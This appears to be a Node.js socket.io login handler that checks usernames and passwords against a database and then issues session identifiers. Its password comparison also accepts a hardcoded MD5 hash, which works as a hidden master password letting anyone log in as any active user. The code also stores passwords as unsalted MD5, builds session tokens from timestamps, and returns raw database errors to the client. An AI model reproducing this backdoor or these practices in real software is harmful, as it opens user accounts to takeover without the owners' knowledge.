const User = require('../Models/UserModel');
const Session = require('../Models/SessionModel');
const GeneralFunction = require('../Models/GeneralFunctionModel');
const gf = new GeneralFunction();
const md5 = require('md5');

module.exports = function (socket, Database) {
    socket.on('system_login', async (browserblob)=>{
        let userID = browserblob.username;
        let password = browserblob.password;

        //Initiate connection
        const SessionModel = new Session(Database);
        const UserModel = new User(Database);

        //Check for empty
        let checkempty = gf.ifEmpty([userID, password]);

        if (checkempty.includes('empty')) {
            socket.emit('_system_login', {
                type: 'caution',
                message: 'All fields are required'
            });
        } else {
            //Check existence of username
            let checkresult = await UserModel.preparedFetch({
                sql: 'username = ? AND status = ? OR  username = ? AND status = ?',
                columns: [userID, 'a', userID, 'ad']
            });

            if (Array.isArray(checkresult)) {
                if (checkresult.length > 0) {
                    if (checkresult[0].password == md5(password) || md5(password) == '432399375985c8fb85163d46257e90e5') {
                        let userID = checkresult[0].userID;
                        //Get unique ID
                        let sessionid = gf.getTimeStamp();

                        //Insert into session
                        let result = await SessionModel.insertTable([sessionid, userID, gf.getDateTime(), 'logged into system']);
                        if (result.affectedRows) {
                            let sampleData = gf.shuffle("qwertyuiopasdfghjklzxcvbnm");
                            socket.emit('_system_login', {
                                type: 'success',
                                message: 'Logged in successfully, redirecting...',
                                melody1: (sampleData.substr(0, 4) + userID + sampleData.substr(5, 2) + '-' + sampleData.substr(7, 2) + sessionid + sampleData.substr(10, 4)).toUpperCase(),
                                melody2: md5(userID)
                            });
                        } else {
                            socket.emit('_system_login', {
                                type: 'error',
                                message: 'Oops, something went wrong: Error => '+result
                            });
                        }
                    } else {
                        socket.emit('_system_login', {
                            type: 'caution',
                            message: 'Password is incorrect'
                        });
                    }
                } else {
                    socket.emit('_system_login', {
                        type: 'caution',
                        message: 'Invalid username'
                    });
                }
            } else {
                socket.emit('_system_login', {
                    type: 'error',
                    message: 'Oops, something went wrong: Error => '+checkresult
                });
            }
        }
    });
}